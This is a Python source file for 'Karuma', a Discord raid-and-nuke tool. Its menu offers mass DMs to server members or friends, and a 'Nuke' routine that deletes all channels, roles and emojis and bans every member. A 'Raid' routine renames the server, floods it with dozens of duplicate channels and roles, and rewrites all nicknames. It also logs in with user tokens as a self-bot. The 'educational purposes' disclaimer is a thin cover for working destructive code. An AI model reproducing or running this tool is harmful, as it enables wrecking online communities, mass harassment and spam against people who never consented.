import discord
from discord.ext import commands
import colorama
import os
from colorama import Fore
import time
import getpass
import asyncio
# imports all the stuff you'll need


intents = discord.Intents().default() #activates member intents
intents.members = True
client = discord.Client(intents=intents)
print("DISCLAIMER:")
time.sleep(0.5)
print(f"Client modification and spamming messages are {Fore.LIGHTYELLOW_EX}against Discord's TOS!!{Fore.RESET}")
time.sleep(0.8)
print("Use this tool only for educational purposes and at your own risk")
time.sleep(0.8)
print("Ask the server owner if you're allowed to use this tool")
print(f'''{Fore.GREEN}Mass Dm {Fore.RESET}will only work with a {Fore.GREEN}Bot-Token{Fore.RESET} which has enabled{Fore.GREEN} member intents{Fore.RESET}.
This does also count for {Fore.GREEN}Mass Ban{Fore.RESET} (in the Nuke part of the code) and {Fore.GREEN}Mass Nickname{Fore.RESET} (in the Raid part of the code).
{Fore.GREEN}Mass Dm friends {Fore.RESET}will only work with a {Fore.GREEN}Human-Token.
''')
time.sleep(0.8)
# disclaimer

print(f"Booting {Fore.RED}长闩尺ㄩ爪闩 {Fore.RESET}Bot")
time.sleep(0.4)
print(f"{Fore.RED}25%")
time.sleep(0.6)
print(f"{Fore.YELLOW}50%")
time.sleep(0.7)
print(f"{Fore.LIGHTYELLOW_EX}75%")
time.sleep(0.8)
print(f"{Fore.GREEN}99%")
time.sleep(1.1)
print(f"{Fore.LIGHTBLUE_EX}长闩尺ㄩ爪闩 Bot booted")
time.sleep(1)
# poor booting animation

chupapi = input('Are you using a Bot-Token(enter yes or no)?>> ')
if chupapi == "yes":
    munanyo = "BOT_TOKEN"
elif chupapi == "no":
    munanyo = "HUMAN_TOKEN"
else:
    print(f'{Fore.RED}Invalid option😅\nthe script will automaticly close in 5 seconds')
    time.sleep(5)
    raise SystemExit
# sets bot to true or false

token = input('Input Token>> ')
# gets the token

# mass dm part of the code:
async def massdm():
    print(f'{Fore.LIGHTYELLOW_EX}------')
    if chupapi == "no":
        print(f"{Fore.RED}Mass Dm doesn\'t work with a Human-Token\nthe script will automaticly close in 5 seconds")
        time.sleep(5)
        raise SystemExit
    else:
        pass
    print(f'{Fore.LIGHTYELLOW_EX}Mass Dm was selected')
    while True:
        try:
            guild_id = int(input('Enter the server ID: '))
            break
        except ValueError:
            print(f'{Fore.RED}Invalid option😅')
            continue
    print(f'{Fore.LIGHTYELLOW_EX}------')
    for guild in client.guilds:
        if guild.id == guild_id:
            print('Discord server "{}" was selected as a target...'.format(guild.name))
            print('------')
            send = input(f"{Fore.GREEN}What Should I Send?>>  ")
            for member in guild.members:
                try:
                    await member.send(send)
                    print(f"{Fore.GREEN}[+] Sent{Fore.WHITE} {send} {Fore.GREEN}to {Fore.YELLOW}{member}")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}[-] Didn\'t send{Fore.WHITE} {send} {Fore.GREEN}to {Fore.YELLOW}{member} - {e}")
    print(f'{Fore.GREEN}⚡All tasks completed⚡')
    print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
    time.sleep(5)
    raise SystemExit

# nuke part of the code
async def Nuke():
    print(f'{Fore.LIGHTYELLOW_EX}------')
    print('Nuke was selected')
    if chupapi == "no":
        print(f"{Fore.RED}Mass Ban will not work with a Human-Token")
    else:
        pass
    while True:
        try:
            server_id = int(input(f'{Fore.LIGHTYELLOW_EX}Enter the server ID: '))
            break
        except ValueError:
            print(f'{Fore.RED}Invalid option😅')
            continue
    print(f'{Fore.LIGHTYELLOW_EX}------')
    for guild in client.guilds:
        if guild.id == server_id:
            print('Discord server "{}" was selected as a target...'.format(guild.name))
            print('------')
            print('Before we start, is there a ban reason? (Leave blank for no reason)')
            ban_reason = input('Enter ban reason: ')
            print('------')
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}[+] [CHANNEL DELETED] {Fore.WHITE}{channel.name}{Fore.GREEN} in '{guild.name}'")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}[-] [CHANNEL NOT DELETED] {Fore.WHITE}{channel.name}{Fore.RED} in '{guild.name}' - {e}")
            for role in guild.roles:
                try:
                    await role.delete()
                    print(f"{Fore.GREEN}[+] [ROLE DELETED] {Fore.WHITE}{role.name}{Fore.GREEN} in '{guild.name}'")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}[-] [ROLE NOT DELETED] {Fore.WHITE}{role.name}{Fore.RED} in '{guild.name}' - {e}")
            for member in guild.members:
                try:
                    await guild.ban(member, reason=ban_reason, delete_message_days=7)
                    print(f"{Fore.GREEN}[+] [BANNED] {Fore.WHITE}{member}{Fore.GREEN} (ID: {member.id}) in '{guild.name}'")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}[-] [BAN FAILED] {Fore.WHITE}{member}{Fore.RED} (ID: {member.id}) in '{guild.name}'- {e}")
            for emoji in guild.emojis:
                print(emoji)
                try:
                    await emoji.delete()
                    print(f"{Fore.GREEN}[+] [EMOJI DELETED] {Fore.WHITE}{emoji.name}{Fore.GREEN} in '{guild.name}'")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}[-] [EMOJI NOT DELETED] {Fore.WHITE}{emoji.name}{Fore.RED} in '{guild.name}' - {e}")
    print(f'{Fore.GREEN}⚡All tasks completed⚡')
    print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
    time.sleep(5)
    raise SystemExit

# exit part of the code
def exit():
    print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
    time.sleep(5)
    raise SystemExit

# raid part of the code
async def raid():
    print(f'{Fore.LIGHTYELLOW_EX}------')
    print('Raid was selected')
    if chupapi == "no":
        print(f"{Fore.RED}Mass Nickname does only work with a Bot-Token")
    else:
        pass
    while True:
        try:
            server_id = int(input(f'{Fore.LIGHTYELLOW_EX}Enter the server ID: '))
            break
        except ValueError:
            print(f'{Fore.RED}Invalid option😅')
            continue
    print(f'{Fore.LIGHTYELLOW_EX}------')
    for guild in client.guilds:
        if guild.id == server_id:
            print('Discord server "{}" was selected as a target...'.format(guild.name))
            print('------')
            servername = input(f"{Fore.GREEN}Please enter a guild name>> ")
            role = input(f"{Fore.GREEN}Please enter a role name>> ")
            text_channel = input(f"{Fore.GREEN}Please enter a text channel name>> ")
            newnick = input(f"{Fore.GREEN}Please enter a kind nickname for all the members>> ")
            await guild.edit(name=servername)
            print(f"[+]Renamed the guild to: {Fore.WHITE}{servername}")
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel:{Fore.WHITE} {text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_text_channel(text_channel)
            print(f"{Fore.GREEN}[+]Created a text channel: {Fore.WHITE}{text_channel}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role} {Fore.GREEN}in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role} {Fore.GREEN}in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            await guild.create_role(name=role)
            print(f"{Fore.GREEN}[+]Created a role: {Fore.WHITE}{role}{Fore.GREEN} in {guild.name}")
            await asyncio.sleep(0.1)
            for user in guild.members:
                try:
                    await user.edit(nick=newnick)
                    print(f"{Fore.GREEN}[+]Changed {Fore.WHITE}{user}\'s {Fore.GREEN}nickname in {guild.name} to: {Fore.WHITE}{newnick}")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}[-]Couldn\'t change {Fore.WHITE}{user}\'s{Fore.RED} nickname in {guild.name} to {Fore.WHITE}{newnick}{Fore.RED} - {e}")
    print(f'{Fore.GREEN}⚡All tasks completed⚡')
    print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
    time.sleep(5)
    raise SystemExit

# on ready event
@client.event
async def on_ready():
    print(f'''
{Fore.BLUE}██{Fore.WHITE}╗ {Fore.BLUE} ██{Fore.WHITE}╗ {Fore.BLUE}█████{Fore.WHITE}╗ {Fore.BLUE}██████{Fore.WHITE}╗ {Fore.BLUE}██{Fore.WHITE}╗   {Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}███{Fore.WHITE}╗   {Fore.BLUE}███{Fore.WHITE}╗ {Fore.BLUE}█████{Fore.WHITE}╗
{Fore.BLUE}██{Fore.WHITE}║ {Fore.BLUE}██{Fore.WHITE}╔╝{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}██{Fore.WHITE}║   {Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}████{Fore.WHITE}╗ {Fore.BLUE}████{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗
{Fore.BLUE}█████{Fore.WHITE}═╝ {Fore.BLUE}███████{Fore.WHITE}║{Fore.BLUE}██████{Fore.WHITE}╔╝{Fore.BLUE}██{Fore.WHITE}║   {Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}╔{Fore.BLUE}████{Fore.WHITE}╔{Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}███████{Fore.WHITE}║
{Fore.BLUE}██{Fore.WHITE}╔═{Fore.BLUE}██{Fore.WHITE}╗ {Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}██{Fore.WHITE}║   {Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}║╚{Fore.BLUE}██{Fore.WHITE}╔╝{Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}║
{Fore.BLUE}██{Fore.WHITE}║ ╚{Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}██{Fore.WHITE}║  {Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}║  {Fore.BLUE}██{Fore.WHITE}║╚{Fore.BLUE}██████{Fore.WHITE}╔╝{Fore.BLUE}██{Fore.WHITE}║ ╚═╝ {Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}║  {Fore.BLUE}██{Fore.WHITE}║
{Fore.BLUE}{Fore.WHITE}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
{Fore.WHITE}                                     Made by {Fore.YELLOW}hoemotion  
{Fore.WHITE}Check out the github page for updates: {Fore.LIGHTBLUE_EX}https://github.com/hoemotion/Karuma/           
{Fore.GREEN}Logged in as {Fore.YELLOW}"{client.user}" {Fore.GREEN}(ID:{Fore.YELLOW} {client.user.id}{Fore.GREEN})
[1] Mass Dm friends 
[2] Nuke
[3] Raid
[4] Mass Dm 
[5] Exit Script
''')
    select = input(f"{Fore.GREEN}Select>> ")
    if select == '1':
        print(f'{Fore.LIGHTYELLOW_EX}------')
        if chupapi == "yes":
            print("Mass Dm friends does only work with a Human-Token\nthe script will automaticly close in 5 seconds")
            time.sleep(5)
            raise SystemExit
        else:
            pass
        overflow = input(f"Mass Dm friends was selected\n{Fore.GREEN}What Should I Send?>> ")
        print(f'{Fore.LIGHTYELLOW_EX}------')
        for user in client.user.friends:
            try:
                await user.send(f"{overflow}")
                print(f"{Fore.GREEN}[+] Sent{Fore.WHITE} {overflow} {Fore.GREEN}to {Fore.YELLOW}{user}")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"{Fore.RED}[-] Didn\'t send{Fore.WHITE} {overflow} {Fore.GREEN}to {Fore.YELLOW}{user} - {e}")
        print('⚡All tasks completed⚡')
        print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
        time.sleep(5)
        raise SystemExit
    elif select == '2':
        await Nuke()
    elif select == '5':
        await exit()
    elif select == '3':
        await raid()
    elif select == '4':
        await massdm()
    else:
        print("Invalid option😅\nthe script will automaticly close in 5 seconds")
        time.sleep(5)
        raise SystemExit


if munanyo == "HUMAN_TOKEN":
    client.run(token, bot=False)
elif munanyo == "BOT_TOKEN":
    client.run(token, bot=True)

# the end
